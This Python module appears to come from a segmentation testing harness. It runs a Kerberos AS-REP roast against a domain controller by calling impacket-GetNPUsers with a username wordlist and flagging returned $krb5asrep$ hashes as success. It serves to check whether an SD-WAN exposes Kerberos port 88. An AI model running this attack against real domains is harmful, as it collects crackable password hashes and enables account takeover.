"""Kerberos AS-REP roasting (A -> B DC). Unlike Kerberoast, this needs NO
credentials: it asks the KDC for an AS-REP for each candidate user and any
account with pre-auth disabled (DONT_REQ_PREAUTH) returns a roastable
$krb5asrep$ hash. It's the better no-cred test of whether the SD-WAN exposes /
permits Kerberos attack traffic (88) toward the KVDC domain controller.

Uses wordlists/ad_users.txt as the candidate list.
"""
import os
import shlex

USERS = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                     "wordlists", "ad_users.txt")

META = {
    "id": "kerberos_asrep",
    "name": "Kerberos AS-REP Roast",
    "category": "AD Exploitation",
    "added": True,   # added after the initial harness set
    "control": "Segmentation to DC / Kerberos exposure (88)",
    "fix": "SD-WAN",
    "mitre": ['T1558.004'],
    "cwe": ['CWE-262'],
    "tactic": 'Credential Access',
    "requires": ["impacket-GetNPUsers"],
    "requires_files": [USERS],
    "ports": [("tcp", 88)],
    "success_regex": r"\$krb5asrep\$",
    "blocked_regex": r"timed out|Connection refused|unreachable|Errno|"
                     r"KDC_ERR_S_PRINCIPAL_UNKNOWN|No entries",
}


def run(target, ctx):
    # user list path is quoted (their checkout path may contain spaces); the
    # template still uses {domain}/{target} which core fills in.
    users_q = shlex.quote(USERS)
    return ctx.run_cmd(
        f"impacket-GetNPUsers {{domain}}/ -no-pass -usersfile {users_q} "
        f"-dc-ip {{target}} -request", target)
